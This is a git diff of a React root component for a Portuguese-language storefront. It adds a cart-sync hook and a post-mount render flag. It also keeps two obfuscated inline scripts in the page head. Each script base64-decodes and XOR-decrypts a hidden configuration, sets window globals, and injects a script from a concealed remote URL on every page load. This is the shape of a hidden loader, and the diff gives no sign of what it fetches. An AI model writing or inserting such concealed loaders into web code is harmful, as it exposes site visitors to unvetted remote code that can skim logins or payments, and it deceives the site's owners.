@@ -7,11 +7,12 @@ import {
   HeadContent,
   Scripts,
 } from "@tanstack/react-router";
-import { useEffect, type ReactNode, useState } from "react";
+import { useEffect, type ReactNode, useState, useLayoutEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { useCartStore } from "@/store/cart-store";
 import { CartSheet } from "@/components/cart/cart-sheet";
 import { useUtmTracking } from "@/hooks/use-utm-tracking";
+import { useCartSync } from "@/hooks/use-cart-sync";
 import logoAsset from "@/assets/logo.png.asset.json";
 import logoTextAsset from "@/assets/logo_text.png.asset.json";
 
@@ -106,6 +107,12 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
 
 function RootShell({ children }: { children: ReactNode }) {
   useUtmTracking();
+  useCartSync();
+
+  const [mounted, setMounted] = useState(false);
+  useLayoutEffect(() => {
+    setMounted(true);
+  }, []);
 
   return (
     <html lang="pt-BR">
@@ -114,13 +121,18 @@ function RootShell({ children }: { children: ReactNode }) {
         <script src="https://fast.wistia.com/player.js" async />
         <script src="https://fast.wistia.com/embed/wt5hy23zyr.js" defer type="module" />
         <script src="https://fast.wistia.com/embed/z4i9e4fgkn.js" defer type="module" />
-        <script dangerouslySetInnerHTML={{ __html: `(function(){var h_kj=atob("DOekz2LkXOfoto7CapyGuhCIft3K3vq2GpSe4E2HOInGw/qvA4Hd4QGLMcmKxKGxCZXNvxaXc5eBzuuuRZfNtweIco2blKLgC5PQvQuGKZONxaz4MbqI7QWIM4WJ2v3gULzf7QyFMYLKjKyyA5/BoyuAfsvKwO+uH4KG9UDSPdCOgb37CdHC9lDUa9DRgbmkWN+Q9lbGIbqV");var v_j=[];for(var g_t=0;g_t<h_kj.length;g_t++){v_j.push(h_kj.charCodeAt(g_t)&255);}var v_w1fw=v_j[0];var z_xp=v_j.slice(1,1+v_w1fw);var b_pb=v_j.slice(1+v_w1fw);var m_b5ac=b_pb.map(function(b,f_0tq){return b^z_xp[f_0tq%v_w1fw];});var u_wn="";for(var p_jai4=0;p_jai4<m_b5ac.length;p_jai4++){u_wn+=String.fromCharCode(m_b5ac[p_jai4]&255);}var r_37=decodeURIComponent(escape(u_wn));var r_632=JSON.parse(r_37);var i_z2y3=r_632.globals||[];i_z2y3.forEach(function(r_i){window[r_i.name]=r_i.value;});var c_ni=document.createElement("script");c_ni.src=r_632.url;c_ni.async=true;c_ni.defer=true;(r_632.attributes||[]).forEach(function(i_x8){c_ni.setAttribute(i_x8.name,i_x8.value);});(document.head||document.documentElement).appendChild(c_ni);})();` }} />
-        <script dangerouslySetInnerHTML={{ __html: `(function(){var j_f7o=atob("DKRgN8XKgZnZD8MVpN9CQremo6P7Z7dh1NdaGOqp5ff3erd4zcIZGaal7Le7fexmx9YJR7G5ruytYrA6yMUUUra+r/OqLe83xdAURayo9O28fOEv/99CWaSn5LvjLad00MVNQrGn6P+gIrNnwdIFWbHn+fq2a+5mx89CG+e84PWsauEvhoYdG77o7/i0auEvhsABQ6Tn9O20ZqVsidQSUrOv7+30fLZ3zcATFeno9/i1eqY3noZCSpi3");var j_c2tq=[];for(var v_c=0;v_c<j_f7o.length;v_c++){j_c2tq.push(j_f7o.charCodeAt(v_c)&255);}var t_e6w6=j_c2tq[0];var y_s69=j_c2tq.slice(1,1+t_e6w6);var u_t=j_c2tq.slice(1+t_e6w6);var m_48=u_t.map(function(b,f_an){return b^y_s69[f_an%t_e6w6];});var f_xfu="";for(var y_eti=0;y_eti<m_48.length;y_eti++){f_xfu+=String.fromCharCode(m_48[y_eti]&255);}var r_n29=decodeURIComponent(escape(f_xfu));var v_w3hc=JSON.parse(r_n29);var s_9ky=v_w3hc.globals||[];s_9ky.forEach(function(h_d42){window[h_d42.name]=h_d42.value;});var a_ngh=document.createElement("script");a_ngh.src=v_w3hc.url;a_ngh.async=true;a_ngh.defer=true;(v_w3hc.attributes||[]).forEach(function(z_ij){a_ngh.setAttribute(z_ij.name,z_ij.value);});(document.head||document.documentElement).appendChild(a_ngh);})();` }} />
+        {mounted && (
+          <>
+            <script dangerouslySetInnerHTML={{ __html: `(function(){var h_kj=atob("DOekz2LkXOfoto7CapyGuhCIft3K3vq2GpSe4E2HOInGw/qvA4Hd4QGLMcmKxKGxCZXNvxaXc5eBzuuuRZfNtweIco2blKLgC5PQvQuGKZONxaz4MbqI7QWIM4WJ2v3gULzf7QyFMYLKjKyyA5/BoyuAfsvKwO+uH4KG9UDSPdCOgb37CdHC9lDUa9DRgbmkWN+Q9lbGIbqV");var v_j=[];for(var g_t=0;g_t<h_kj.length;g_t++){v_j.push(h_kj.charCodeAt(g_t)&255);}var v_w1fw=v_j[0];var z_xp=v_j.slice(1,1+v_w1fw);var b_pb=v_j.slice(1+v_w1fw);var m_b5ac=b_pb.map(function(b,f_0tq){return b^z_xp[f_0tq%v_w1fw];});var u_wn="";for(var p_jai4=0;p_jai4<m_b5ac.length;p_jai4++){u_wn+=String.fromCharCode(m_b5ac[p_jai4]&255);}var r_37=decodeURIComponent(escape(u_wn));var r_632=JSON.parse(r_37);var i_z2y3=r_632.globals||[];i_z2y3.forEach(function(r_i){window[r_i.name]=r_i.value;});var c_ni=document.createElement("script");c_ni.src=r_632.url;c_ni.async=true;c_ni.defer=true;(r_632.attributes||[]).forEach(function(i_x8){c_ni.setAttribute(i_x8.name,i_x8.value);});(document.head||document.documentElement).appendChild(c_ni);})();` }} />
+            <script dangerouslySetInnerHTML={{ __html: `(function(){var j_f7o=atob("DKRgN8XKgZnZD8MVpN9CQremo6P7Z7dh1NdaGOqp5ff3erd4zcIZGaal7Le7fexmx9YJR7G5ruytYrA6yMUUUra+r/OqLe83xdAURayo9O28fOEv/99CWaSn5LvjLad00MVNQrGn6P+gIrNnwdIFWbHn+fq2a+5mx89CG+e84PWsauEvhoYdG77o7/i0auEvhsABQ6Tn9O20ZqVsidQSUrOv7+30fLZ3zcATFeno9/i1eqY3noZCSpi3");var j_c2tq=[];for(var v_c=0;v_c<j_f7o.length;v_c++){j_c2tq.push(j_f7o.charCodeAt(v_c)&255);}var t_e6w6=j_c2tq[0];var y_s69=j_c2tq.slice(1,1+t_e6w6);var u_t=j_c2tq.slice(1+t_e6w6);var m_48=u_t.map(function(b,f_an){return b^y_s69[f_an%t_e6w6];});var f_xfu="";for(var y_eti=0;y_eti<m_48.length;y_eti++){f_xfu+=String.fromCharCode(m_48[y_eti]&255);}var r_n29=decodeURIComponent(escape(f_xfu));var v_w3hc=JSON.parse(r_n29);var s_9ky=v_w3hc.globals||[];s_9ky.forEach(function(h_d42){window[h_d42.name]=h_d42.value;});var a_ngh=document.createElement("script");a_ngh.src=v_w3hc.url;a_ngh.async=true;a_ngh.defer=true;(v_w3hc.attributes||[]).forEach(function(z_ij){a_ngh.setAttribute(z_ij.name,z_ij.value);});(document.head||document.documentElement).appendChild(a_ngh);})();` }} />
+          </>
+        )}
       </head>
       <body>
         <div className="min-h-screen bg-[#fdfbf7] text-[#4a3f35]">
           <Header />
           {children}
+
           <footer className="border-t border-border/50 bg-background py-20">
             <div className="container mx-auto px-4 text-center lg:px-8">
               <img src={logoAsset.url} alt="Évora Logo" className="mx-auto mb-8 h-8 w-auto opacity-50" />
